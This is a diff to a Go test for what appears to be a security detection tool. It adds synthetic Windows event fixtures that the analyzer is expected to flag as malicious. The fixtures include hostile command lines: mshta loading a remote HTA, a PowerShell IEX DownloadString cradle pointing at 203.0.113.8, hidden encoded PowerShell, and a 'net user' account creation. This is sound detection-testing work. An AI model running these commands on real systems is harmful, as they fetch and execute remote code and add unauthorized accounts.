@@ -22,6 +22,12 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 		{ID: "hostile-task", EventType: model.EventScheduledTaskCreate, ProcessName: "mshta.exe", CommandLine: `C:\Windows\System32\mshta.exe https://203.0.113.8/a.hta`, Extra: map[string]string{"task_name": `\Microsoft\Windows\Maintenance\Daily`, "evidence_kind": "task_configuration"}},
 		{ID: "hostile-script", EventType: model.EventPowerShellScript, CommandLine: `IEX ([Convert]::FromBase64String($value)); net user alice DummySecret42 /add`},
 		{ID: "unknown-encoded", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -nop -enc AAAA`},
+		{ID: "host-options-task", EventType: model.EventScheduledTaskCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -InputFormat Text -w hidden -enc AAAA`},
+		{ID: "escaped-script", EventType: model.EventPowerShellScript, CommandLine: "Write-Output `#; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')"},
+		{ID: "encoded-order-shell", EventType: model.EventProcessCreate, ProcessName: "cmd.exe", ParentProcessName: "cmd.exe", CommandLine: `cmd.exe /c powershell.exe -enc AAAA -w hidden`},
+		{ID: "writable-script-task", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `C:\Windows\System32\wscript.exe "C:\Users\alice\AppData\Local\Temp\job.vbs"`},
+		{ID: "remote-data-task", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs https://203.0.113.8/api`},
+		{ID: "unc-data-task", EventType: model.EventScheduledTaskCreate, ProcessName: "cscript.exe", CommandLine: `cscript.exe C:\Tools\audit.vbs \\host01\share\data.txt`},
 	}
 	col := model.Collection{ID: "controls-collection", CaseID: c.ID, SourceType: model.SourceTypeLegacy, IngestionStatus: model.CollectionStatusPending}
 	sf := model.SourceFile{ID: "controls-source", CaseID: c.ID, CollectionID: col.ID, OriginalFilename: "normalized.json", Path: "normalized.json", ImportStatus: model.SourceFileImported, Supported: true, Parser: "normalized-software-proof", ArtifactType: model.ArtifactWindowsEventLog}
@@ -59,16 +65,19 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 			t.Fatal("finding secret leak")
 		}
 	}
-	if len(selected) != 4 {
-		t.Fatalf("selected %d leads want 4: %+v", len(selected), selected)
+	if len(selected) != 8 {
+		t.Fatalf("selected %d leads want 8: %+v", len(selected), selected)
 	}
-	for _, id := range []string{"hostile-shell", "hostile-task", "hostile-script"} {
+	for _, id := range []string{"hostile-shell", "hostile-task", "hostile-script", "host-options-task", "escaped-script", "encoded-order-shell"} {
 		if selected[id].Severity != model.SeverityHigh {
 			t.Fatalf("lost positive %s", id)
 		}
 	}
 	if selected["unknown-encoded"].Severity != model.SeverityMedium {
 		t.Fatal("unknown encoded lead lost or over-escalated")
+	}
+	if f := selected["writable-script-task"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
+		t.Fatal("writable script target lost medium/low lead")
 	}
 	inv := getInvestigations(t, mux, c.ID)
 	if len(inv) == 0 {
